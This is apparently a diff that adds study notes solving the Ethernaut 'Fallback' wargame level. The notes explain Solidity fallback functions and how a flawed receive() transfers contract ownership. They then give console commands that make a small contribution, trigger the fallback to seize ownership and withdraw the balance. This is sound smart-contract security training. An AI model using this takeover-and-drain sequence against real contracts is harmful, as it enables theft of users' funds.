@@ -1,0 +1,70 @@
+------------------
+NOTES
+------------------
+set up URL: https://ethernaut.openzeppelin.com/level/0x4E73b858fD5D7A5fc1c3455061dE52a53F35d966
+level URL: https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008
+
+LEVEL 1: FALLBACK
+------------------
+
+Important notes
+ - Fallback method
+     - Gives a contract a way to receive straight ether instead of a specific
+			 function
+     - a function that is called if there is no other functions match the
+			 identifier
+     - Function must be marked as payable
+     - Only one can exist
+     - https://www.geeksforgeeks.org/solidity-fall-back-function/
+
+Vulnerability - Abusing the fallback function
+	- Fallback function is called when sending eth and there is no function
+		defined
+	- Vuln in the code
+	   - Given the hint to find how to change the owner of the contract
+	   - Two spots in the code:
+	       - contribute()
+	           - if(contributions[msg.sender] > contributions[owner]) {
+      						owner = msg.sender;
+    						}
+	           - If a new contribution is sent that is more than the
+							 contribution of the owner, change the owner to the new
+							 contributor
+	           - EZPZ - HOWEVER, in the constructor the contract was initialized
+							 with a balance of 1000 ETH
+	           	    - contributions[msg.sender] = 1000 * (1 ether);
+	           	    - Would take a long time to drip the eth out from a faucet
+						 - Contribute also requires the contribution to be less than .001
+							 ETH
+	       - receive()
+	           - Fallback function, meaning can  call with
+							 contract.sendTransaction
+	           - Requirements
+	               - require(msg.value > 0 && contributions[msg.sender] > 0);
+	               - The contributor has to send some eth AND the contributor
+									 has to have ALREADY sent eth
+	               - If these are met, the contract will change the owner to the
+									 new contributor
+
+Exploitation
+	- Three steps to attack the contract
+	    - Send a valid amount of eth to the contract
+	        - Create a valid contribution from console
+	            - await contract.contribute.sendTransaction({value: Number(toWei(".0001"))})
+	        		    - Number(toWei('.0001')) is used for .0001 < .001 (max contribution value)
+	    - Call the fallback function with some amount of eth
+	        - Show the current owner
+	            - await contract.owner()
+								'0x9CB391dbcD447E645D6Cb55dE6ca23164130D008'
+	        - Call the fallback with a raw transaction sent
+	            - await contract.sendTransaction({value: Number(toWei('.001'))})
+	            - notice contact.sendTransaction vs
+								contact.contribute.sendTransaction
+					- Show the new owner
+					    - await contract.owner()
+								'0x681A75F9524b5e015d48DE5B8Fe71D5258328ff8'
+	    - Call the withdraw() function
+	        - Withdraw the balance with built in method
+	            - await contract.withdraw()
+					- As long as the transaction completes, you are free to submit the
+						instance via the button
